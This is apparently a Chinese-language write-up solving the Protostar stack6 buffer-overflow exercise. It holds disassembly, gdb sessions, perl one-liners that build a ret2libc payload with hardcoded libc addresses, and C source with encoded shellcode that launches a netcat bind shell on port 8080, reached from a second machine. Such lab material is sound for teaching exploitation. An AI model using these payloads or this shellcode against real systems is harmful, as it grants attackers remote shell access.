08048484 <getpath>:
 8048484:       55                      push   %ebp
 8048485:       89 e5                   mov    %esp,%ebp
 8048487:       83 ec 68                sub    $0x68,%esp
 804848a:       b8 d0 85 04 08          mov    $0x80485d0,%eax
 804848f:       89 04 24                mov    %eax,(%esp)
 8048492:       e8 29 ff ff ff          call   80483c0 <printf@plt>
 8048497:       a1 20 97 04 08          mov    0x8049720,%eax
 804849c:       89 04 24                mov    %eax,(%esp)
 804849f:       e8 0c ff ff ff          call   80483b0 <fflush@plt>
 80484a4:       8d 45 b4                lea    -0x4c(%ebp),%eax
 80484a7:       89 04 24                mov    %eax,(%esp)
 80484aa:       e8 d1 fe ff ff          call   8048380 <gets@plt> /* 溢出点 */
 80484af:       8b 45 04                mov    0x4(%ebp),%eax
 80484b2:       89 45 f4                mov    %eax,-0xc(%ebp)
 80484b5:       8b 45 f4                mov    -0xc(%ebp),%eax
 80484b8:       25 00 00 00 bf          and    $0xbf000000,%eax  /* 注意这里的判断，需要eax=0xbfxxxxxx*/
 80484bd:       3d 00 00 00 bf          cmp    $0xbf000000,%eax
 80484c2:       75 20                   jne    80484e4 <getpath+0x60>
 80484c4:       b8 e4 85 04 08          mov    $0x80485e4,%eax
 80484c9:       8b 55 f4                mov    -0xc(%ebp),%edx
 80484cc:       89 54 24 04             mov    %edx,0x4(%esp)
 80484d0:       89 04 24                mov    %eax,(%esp)
 80484d3:       e8 e8 fe ff ff          call   80483c0 <printf@plt>
 80484d8:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484df:       e8 bc fe ff ff          call   80483a0 <_exit@plt>

 80484e4:       b8 f0 85 04 08          mov    $0x80485f0,%eax
 80484e9:       8d 55 b4                lea    -0x4c(%ebp),%edx
 80484ec:       89 54 24 04             mov    %edx,0x4(%esp)
 80484f0:       89 04 24                mov    %eax,(%esp)
 80484f3:       e8 c8 fe ff ff          call   80483c0 <printf@plt>
 80484f8:       c9                      leave  
 80484f9:       c3                      ret    

080484fa <main>:
 80484fa:       55                      push   %ebp
 80484fb:       89 e5                   mov    %esp,%ebp
 80484fd:       83 e4 f0                and    $0xfffffff0,%esp
 8048500:       e8 7f ff ff ff          call   8048484 <getpath>
 8048505:       89 ec                   mov    %ebp,%esp
 8048507:       5d                      pop    %ebp
 8048508:       c3                      ret    
 8048509:       90                      nop
 804850a:       90                      nop
 804850b:       90                      nop
 804850c:       90                      nop
 804850d:       90                      nop
 804850e:       90                      nop
 804850f:       90                      nop


(gdb) shell perl -e 'print"A"x(83)."\xbf"' > /tmp/input 
(gdb) r < /tmp/input 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack6 < /tmp/input
input path please: 
Breakpoint 2, 0x080484b8 in getpath () at stack6/stack6.c:17
17      in stack6/stack6.c
(gdb) x/x $eax
0xbf414141:     Cannot access memory at address 0xbf414141
(gdb) c
Continuing.
bzzzt (0xbf414141)

Program exited with code 01.
(gdb) 


(gdb) shell perl -e 'print"A"x(80)."B"x(4)' > /tmp/input  
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack6 < /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      in stack6/stack6.c
(gdb) x/x $esp
0xbffff6dc:     0x42424242
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 

注意这次的偏移是80，不是76，如果写成shell perl -e 'print"A"x(76)."B"x(4)' > /tmp/input
那么崩溃点在main函数的pop ebp处，不在getpath函数中


另外，getpath函数中对返回地址进行了判断：
80484b8:       25 00 00 00 bf          and    $0xbf000000,%eax  /* 注意这里的判断，需要eax=0xbfxxxxxx*/
80484bd:       3d 00 00 00 bf          cmp    $0xbf000000,%eax
如果返回地址以0xbf000000开头，则直接退出，这说明shellcode的地址不能在栈上,
只能使用ret2lib了

shell perl -e 'print"A"x(80)."system_addr"."exit_addr"."/bin/sh addr"' > /tmp/input

(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecdfb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec40c0 <*__GI_exit>
(gdb) q
A debugging session is active.

        Inferior 1 [process 1693] will be killed.

Quit anyway? (y or n) y
user@protostar:/opt/protostar/bin$ cd ~
user@protostar:~$ ./getenv SHELL
SHELL is at 0xbffff904
user@protostar:~$ cd /opt/protostar/bin
user@protostar:/opt/protostar/bin$  perl -e 'print"A"x(80)."\xb0\xdf\xec\xb7"."\xc0\x40\xec\xb7"."\x04\xf9\xff\xbf"' > /tmp/input
user@protostar:/opt/protostar/bin$ cat /tmp/input | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA斑旆AAAAAAAAAAAA斑旆繞旆
user@protostar:/opt/protostar/bin$ id
uid=1001(user) gid=1001(user) groups=1001(user)
user@protostar:/opt/protostar/bin$ 

我们用nc shellcode 做一个可执行文件，然后把它载入到环境变量中，再用system去执行它

nc_shell.c

#include <stdio.h>
char shellcode[] =
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e"
"\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80"
"\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d"
"\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";
 
int main()
{
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
}


user@protostar:~$ export PAYLOAD=$'/home/user/nc_shell'
user@protostar:~$ ./getenv PAYLOAD
PAYLOAD is at 0xbfffffd4
user@protostar:~$ cd /opt/protostar/bin/
user@protostar:/opt/protostar/bin$ perl -e 'print"A"x(80)."\xb0\xdf\xec\xb7"."\xc0\x40\xec\xb7"."\xd4\xff\xff\xbf"' > /tmp/input  
user@protostar:/opt/protostar/bin$ cat /tmp/input | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA斑旆AAAAAAAAAAAA斑旆繞旆

在另一台机器上连接：
fusion@fusion:~$ nc 192.168.216.147 8080


